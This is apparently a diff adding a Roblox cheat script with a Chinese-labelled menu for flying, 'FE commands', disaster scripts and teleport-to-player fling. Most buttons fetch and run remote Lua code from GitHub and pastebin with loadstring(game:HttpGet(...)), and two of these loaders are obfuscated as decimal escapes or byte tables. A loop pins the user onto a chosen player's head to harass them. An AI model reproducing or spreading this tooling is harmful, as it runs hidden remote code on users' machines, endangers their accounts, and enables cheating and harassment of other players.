@@ -1,0 +1,495 @@
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "MainGui"
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 700, 0, 800)
+MainFrame.Position = UDim2.new(0.5, -350, 0.5, -400)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 15)
+UICorner.Parent = MainFrame
+
+local TitleBar = Instance.new("Frame")
+TitleBar.Name = "TitleBar"
+TitleBar.Size = UDim2.new(1, 0, 0, 60)
+TitleBar.Position = UDim2.new(0, 0, 0, 0)
+TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = MainFrame
+
+local UICorner2 = Instance.new("UICorner")
+UICorner2.CornerRadius = UDim.new(0, 15)
+UICorner2.Parent = TitleBar
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Name = "TitleLabel"
+TitleLabel.Size = UDim2.new(0.7, 0, 1, 0)
+TitleLabel.Position = UDim2.new(0.05, 0, 0, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.Text = "PGT脚本"
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextSize = 24
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Parent = TitleBar
+
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Name = "MinimizeButton"
+MinimizeButton.Size = UDim2.new(0, 45, 0, 45)
+MinimizeButton.Position = UDim2.new(0.8, 0, 0.125, 0)
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.Text = "-"
+MinimizeButton.Font = Enum.Font.GothamBold
+MinimizeButton.TextSize = 28
+MinimizeButton.Parent = TitleBar
+
+local CloseButton = Instance.new("TextButton")
+CloseButton.Name = "CloseButton"
+CloseButton.Size = UDim2.new(0, 45, 0, 45)
+CloseButton.Position = UDim2.new(0.9, 0, 0.125, 0)
+CloseButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Text = "X"
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.TextSize = 20
+CloseButton.Parent = TitleBar
+
+local SideBar = Instance.new("Frame")
+SideBar.Name = "SideBar"
+SideBar.Size = UDim2.new(0, 150, 1, -60)
+SideBar.Position = UDim2.new(0, 0, 0, 60)
+SideBar.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+SideBar.BorderSizePixel = 0
+SideBar.Parent = MainFrame
+
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Name = "ContentFrame"
+ContentFrame.Size = UDim2.new(1, -150, 1, -60)
+ContentFrame.Position = UDim2.new(0, 150, 0, 60)
+ContentFrame.BackgroundTransparency = 1
+ContentFrame.Parent = MainFrame
+
+local GeneralTabButton = Instance.new("TextButton")
+GeneralTabButton.Name = "GeneralTabButton"
+GeneralTabButton.Size = UDim2.new(0.8, 0, 0, 50)
+GeneralTabButton.Position = UDim2.new(0.1, 0, 0, 20)
+GeneralTabButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+GeneralTabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+GeneralTabButton.Text = "通用功能"
+GeneralTabButton.Font = Enum.Font.GothamSemibold
+GeneralTabButton.TextSize = 16
+GeneralTabButton.Parent = SideBar
+
+local TeleportTabButton = Instance.new("TextButton")
+TeleportTabButton.Name = "TeleportTabButton"
+TeleportTabButton.Size = UDim2.new(0.8, 0, 0, 50)
+TeleportTabButton.Position = UDim2.new(0.1, 0, 0, 90)
+TeleportTabButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+TeleportTabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportTabButton.Text = "传送与甩飞"
+TeleportTabButton.Font = Enum.Font.GothamSemibold
+TeleportTabButton.TextSize = 16
+TeleportTabButton.Parent = SideBar
+
+local NaturalDisasterTabButton = Instance.new("TextButton")
+NaturalDisasterTabButton.Name = "NaturalDisasterTabButton"
+NaturalDisasterTabButton.Size = UDim2.new(0.8, 0, 0, 50)
+NaturalDisasterTabButton.Position = UDim2.new(0.1, 0, 0, 160)
+NaturalDisasterTabButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+NaturalDisasterTabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+NaturalDisasterTabButton.Text = "自然灾害"
+NaturalDisasterTabButton.Font = Enum.Font.GothamSemibold
+NaturalDisasterTabButton.TextSize = 16
+NaturalDisasterTabButton.Parent = SideBar
+
+local GeneralContent = Instance.new("Frame")
+GeneralContent.Name = "GeneralContent"
+GeneralContent.Size = UDim2.new(1, 0, 1, 0)
+GeneralContent.BackgroundTransparency = 1
+GeneralContent.Visible = true
+GeneralContent.Parent = ContentFrame
+
+local TeleportContent = Instance.new("Frame")
+TeleportContent.Name = "TeleportContent"
+TeleportContent.Size = UDim2.new(1, 0, 1, 0)
+TeleportContent.BackgroundTransparency = 1
+TeleportContent.Visible = false
+TeleportContent.Parent = ContentFrame
+
+local NaturalDisasterContent = Instance.new("Frame")
+NaturalDisasterContent.Name = "NaturalDisasterContent"
+NaturalDisasterContent.Size = UDim2.new(1, 0, 1, 0)
+NaturalDisasterContent.BackgroundTransparency = 1
+NaturalDisasterContent.Visible = false
+NaturalDisasterContent.Parent = ContentFrame
+
+local IronFistButton = Instance.new("TextButton")
+IronFistButton.Name = "IronFistButton"
+IronFistButton.Size = UDim2.new(0.8, 0, 0, 40)
+IronFistButton.Position = UDim2.new(0.1, 0, 0, 30)
+IronFistButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+IronFistButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+IronFistButton.Text = "铁拳"
+IronFistButton.Font = Enum.Font.GothamSemibold
+IronFistButton.TextSize = 14
+IronFistButton.Parent = GeneralContent
+
+local FlyButton = Instance.new("TextButton")
+FlyButton.Name = "FlyButton"
+FlyButton.Size = UDim2.new(0.8, 0, 0, 40)
+FlyButton.Position = UDim2.new(0.1, 0, 0, 90)
+FlyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+FlyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+FlyButton.Text = "飞行"
+FlyButton.Font = Enum.Font.GothamSemibold
+FlyButton.TextSize = 14
+FlyButton.Parent = GeneralContent
+
+local ChineseFEButton = Instance.new("TextButton")
+ChineseFEButton.Name = "ChineseFEButton"
+ChineseFEButton.Size = UDim2.new(0.8, 0, 0, 40)
+ChineseFEButton.Position = UDim2.new(0.1, 0, 0, 150)
+ChineseFEButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+ChineseFEButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ChineseFEButton.Text = "中文FE指令"
+ChineseFEButton.Font = Enum.Font.GothamSemibold
+ChineseFEButton.TextSize = 14
+ChineseFEButton.Parent = GeneralContent
+
+local TeleportButton = Instance.new("TextButton")
+TeleportButton.Name = "TeleportButton"
+TeleportButton.Size = UDim2.new(0.8, 0, 0, 40)
+TeleportButton.Position = UDim2.new(0.1, 0, 0, 30)
+TeleportButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+TeleportButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportButton.Text = "传送到玩家头上"
+TeleportButton.Font = Enum.Font.GothamSemibold
+TeleportButton.TextSize = 14
+TeleportButton.Parent = TeleportContent
+
+local NaturalDisasterButton = Instance.new("TextButton")
+NaturalDisasterButton.Name = "NaturalDisasterButton"
+NaturalDisasterButton.Size = UDim2.new(0.8, 0, 0, 40)
+NaturalDisasterButton.Position = UDim2.new(0.1, 0, 0, 30)
+NaturalDisasterButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+NaturalDisasterButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+NaturalDisasterButton.Text = "自然灾害通用"
+NaturalDisasterButton.Font = Enum.Font.GothamSemibold
+NaturalDisasterButton.TextSize = 14
+NaturalDisasterButton.Parent = NaturalDisasterContent
+
+local MinimizedFrame = Instance.new("Frame")
+MinimizedFrame.Name = "MinimizedFrame"
+MinimizedFrame.Size = UDim2.new(0, 80, 0, 80)
+MinimizedFrame.Position = UDim2.new(0.5, -40, 0.5, -40)
+MinimizedFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+MinimizedFrame.BorderSizePixel = 0
+MinimizedFrame.Active = true
+MinimizedFrame.Draggable = true
+MinimizedFrame.Visible = false
+MinimizedFrame.Parent = ScreenGui
+
+local UICorner3 = Instance.new("UICorner")
+UICorner3.CornerRadius = UDim.new(1, 0)
+UICorner3.Parent = MinimizedFrame
+
+local ExpandButton = Instance.new("TextButton")
+ExpandButton.Name = "ExpandButton"
+ExpandButton.Size = UDim2.new(1, 0, 1, 0)
+ExpandButton.Position = UDim2.new(0, 0, 0, 0)
+ExpandButton.BackgroundTransparency = 1
+ExpandButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExpandButton.Text = "T"
+ExpandButton.Font = Enum.Font.GothamBold
+ExpandButton.TextSize = 32
+ExpandButton.Parent = MinimizedFrame
+
+local function setupButtonHover(button)
+    button.MouseEnter:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(65, 65, 70)
+    end)
+    
+    button.MouseLeave:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+    end)
+end
+
+setupButtonHover(GeneralTabButton)
+setupButtonHover(TeleportTabButton)
+setupButtonHover(NaturalDisasterTabButton)
+setupButtonHover(IronFistButton)
+setupButtonHover(FlyButton)
+setupButtonHover(ChineseFEButton)
+setupButtonHover(TeleportButton)
+setupButtonHover(NaturalDisasterButton)
+setupButtonHover(MinimizeButton)
+setupButtonHover(CloseButton)
+
+local function switchTab(selectedTab)
+    GeneralContent.Visible = false
+    TeleportContent.Visible = false
+    NaturalDisasterContent.Visible = false
+    
+    GeneralTabButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+    TeleportTabButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+    NaturalDisasterTabButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+    
+    if selectedTab == "General" then
+        GeneralContent.Visible = true
+        GeneralTabButton.BackgroundColor3 = Color3.fromRGB(70, 70, 75)
+    elseif selectedTab == "Teleport" then
+        TeleportContent.Visible = true
+        TeleportTabButton.BackgroundColor3 = Color3.fromRGB(70, 70, 75)
+    elseif selectedTab == "NaturalDisaster" then
+        NaturalDisasterContent.Visible = true
+        NaturalDisasterTabButton.BackgroundColor3 = Color3.fromRGB(70, 70, 75)
+    end
+end
+
+GeneralTabButton.MouseButton1Click:Connect(function()
+    switchTab("General")
+end)
+
+TeleportTabButton.MouseButton1Click:Connect(function()
+    switchTab("Teleport")
+end)
+
+NaturalDisasterTabButton.MouseButton1Click:Connect(function()
+    switchTab("NaturalDisaster")
+end)
+
+MinimizeButton.MouseButton1Click:Connect(function()
+    MainFrame.Visible = false
+    MinimizedFrame.Visible = true
+end)
+
+ExpandButton.MouseButton1Click:Connect(function()
+    MinimizedFrame.Visible = false
+    MainFrame.Visible = true
+end)
+
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+IronFistButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
+end)
+
+FlyButton.MouseButton1Click:Connect(function()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\90\66\122\99\84\109\49\102\34\41\41\40\41\10")()
+end)
+
+ChineseFEButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,97,110,103,122,104,101,104,97,111,104,47,102,108,121,45,97,119,97,121,47,109,97,105,110,47,37,69,54,37,56,67,37,56,55,37,69,52,37,66,66,37,56,65,37,69,52,37,66,56,37,65,68,37,69,54,37,57,54,37,56,55,46,116,120,116})end)())))()
+end)
+
+NaturalDisasterButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))()
+end)
+
+local isTeleporting = false
+local currentTeleportConnection = nil
+local nameMode = true
+
+TeleportButton.MouseButton1Click:Connect(function()
+    local TeleportGui = Instance.new("ScreenGui")
+    TeleportGui.Name = "TeleportGui"
+    TeleportGui.Parent = game.Players.LocalPlayer.PlayerGui
+    TeleportGui.ResetOnSpawn = false
+    
+    local TeleportFrame = Instance.new("Frame")
+    TeleportFrame.Size = UDim2.new(0, 450, 0, 280)
+    TeleportFrame.Position = UDim2.new(0.5, -225, 0.5, -140)
+    TeleportFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    TeleportFrame.BorderSizePixel = 0
+    TeleportFrame.Active = true
+    TeleportFrame.Draggable = true
+    TeleportFrame.Parent = TeleportGui
+    
+    local UICorner4 = Instance.new("UICorner")
+    UICorner4.CornerRadius = UDim.new(0, 15)
+    UICorner4.Parent = TeleportFrame
+    
+    local TitleBar2 = Instance.new("Frame")
+    TitleBar2.Name = "TitleBar2"
+    TitleBar2.Size = UDim2.new(1, 0, 0, 50)
+    TitleBar2.Position = UDim2.new(0, 0, 0, 0)
+    TitleBar2.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    TitleBar2.BorderSizePixel = 0
+    TitleBar2.Parent = TeleportFrame
+    
+    local Title2 = Instance.new("TextLabel")
+    Title2.Size = UDim2.new(0.7, 0, 1, 0)
+    Title2.Position = UDim2.new(0.05, 0, 0, 0)
+    Title2.BackgroundTransparency = 1
+    Title2.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title2.Text = "传送到玩家"
+    Title2.Font = Enum.Font.GothamBold
+    Title2.TextSize = 18
+    Title2.TextXAlignment = Enum.TextXAlignment.Left
+    Title2.Parent = TitleBar2
+    
+    local CloseButton3 = Instance.new("TextButton")
+    CloseButton3.Size = UDim2.new(0, 40, 0, 40)
+    CloseButton3.Position = UDim2.new(0.9, 0, 0.1, 0)
+    CloseButton3.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+    CloseButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseButton3.Text = "X"
+    CloseButton3.Font = Enum.Font.GothamBold
+    CloseButton3.TextSize = 18
+    CloseButton3.Parent = TitleBar2
+    
+    local ModeButton = Instance.new("TextButton")
+    ModeButton.Size = UDim2.new(0, 140, 0, 40)
+    ModeButton.Position = UDim2.new(0.05, 0, 0, 65)
+    ModeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+    ModeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ModeButton.Text = "名称模式"
+    ModeButton.Font = Enum.Font.Gotham
+    ModeButton.TextSize = 14
+    ModeButton.Parent = TeleportFrame
+    
+    local PlayerNameBox = Instance.new("TextBox")
+    PlayerNameBox.Size = UDim2.new(0.8, 0, 0, 45)
+    PlayerNameBox.Position = UDim2.new(0.1, 0, 0, 125)
+    PlayerNameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+    PlayerNameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    PlayerNameBox.PlaceholderText = "输入玩家名字"
+    PlayerNameBox.Font = Enum.Font.Gotham
+    PlayerNameBox.TextSize = 14
+    PlayerNameBox.Parent = TeleportFrame
+    
+    local TeleportConfirm = Instance.new("TextButton")
+    TeleportConfirm.Size = UDim2.new(0.6, 0, 0, 45)
+    TeleportConfirm.Position = UDim2.new(0.2, 0, 0, 190)
+    TeleportConfirm.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+    TeleportConfirm.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TeleportConfirm.Text = "开始传送"
+    TeleportConfirm.Font = Enum.Font.GothamSemibold
+    TeleportConfirm.TextSize = 16
+    TeleportConfirm.Parent = TeleportFrame
+    
+    local StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Size = UDim2.new(0.8, 0, 0, 30)
+    StatusLabel.Position = UDim2.new(0.1, 0, 0, 250)
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    StatusLabel.Text = "状态: 未传送"
+    StatusLabel.Font = Enum.Font.Gotham
+    StatusLabel.TextSize = 14
+    StatusLabel.Parent = TeleportFrame
+    
+    local function findPlayerByName(name)
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if nameMode then
+                if string.lower(player.Name) == string.lower(name) then
+                    return player
+                end
+            else
+                if string.lower(player.DisplayName) == string.lower(name) then
+                    return player
+                end
+            end
+        end
+        return nil
+    end
+    
+    local function stopTeleporting()
+        if currentTeleportConnection then
+            currentTeleportConnection:Disconnect()
+            currentTeleportConnection = nil
+        end
+        isTeleporting = false
+        TeleportConfirm.Text = "开始传送"
+        StatusLabel.Text = "状态: 已停止"
+        TeleportConfirm.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+    end
+    
+    local function startTeleporting(playerName)
+        local targetPlayer = findPlayerByName(playerName)
+        if not targetPlayer then
+            StatusLabel.Text = "状态: 玩家未找到!"
+            wait(2)
+            StatusLabel.Text = "状态: 未传送"
+            return
+        end
+        
+        isTeleporting = true
+        TeleportConfirm.Text = "停止传送"
+        TeleportConfirm.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+        StatusLabel.Text = "状态: 传送中..."
+        
+        currentTeleportConnection = game:GetService("RunService").Heartbeat:Connect(function()
+            if not isTeleporting then
+                stopTeleporting()
+                return
+            end
+            
+            local targetPlayer = findPlayerByName(playerName)
+            local character = game.Players.LocalPlayer.Character
+            
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") and character and character:FindFirstChild("HumanoidRootPart") then
+                character.HumanoidRootPart.CFrame = targetPlayer.Character.Head.CFrame + Vector3.new(0, 3, 0)
+            else
+                StatusLabel.Text = "状态: 目标不可达"
+                stopTeleporting()
+            end
+        end)
+    end
+    
+    ModeButton.MouseButton1Click:Connect(function()
+        nameMode = not nameMode
+        if nameMode then
+            ModeButton.Text = "名称模式"
+            PlayerNameBox.PlaceholderText = "输入玩家名字"
+        else
+            ModeButton.Text = "昵称模式"
+            PlayerNameBox.PlaceholderText = "输入玩家昵称"
+        end
+    end)
+    
+    TeleportConfirm.MouseButton1Click:Connect(function()
+        local playerName = PlayerNameBox.Text
+        if playerName ~= "" then
+            if isTeleporting then
+                stopTeleporting()
+            else
+                startTeleporting(playerName)
+            end
+        end
+    end)
+    
+    CloseButton3.MouseButton1Click:Connect(function()
+        stopTeleporting()
+        TeleportGui:Destroy()
+    end)
+    
+    setupButtonHover(ModeButton)
+    setupButtonHover(TeleportConfirm)
+    setupButtonHover(CloseButton3)
+end)
+
+local function adaptToScreen()
+    local viewportSize = workspace.CurrentCamera.ViewportSize
+    local scale = math.min(viewportSize.X / 1920, viewportSize.Y / 1080) * 1.2
+    
+    MainFrame.Size = UDim2.new(0, 700 * scale, 0, 800 * scale)
+    MainFrame.Position = UDim2.new(0.5, -350 * scale, 0.5, -400 * scale)
+    MinimizedFrame.Size = UDim2.new(0, 80 * scale, 0, 80 * scale)
+    MinimizedFrame.Position = UDim2.new(0.1, 0, 0.1, 0)
+end
+
+adaptToScreen()
+workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(adaptToScreen)
+
+switchTab("General")
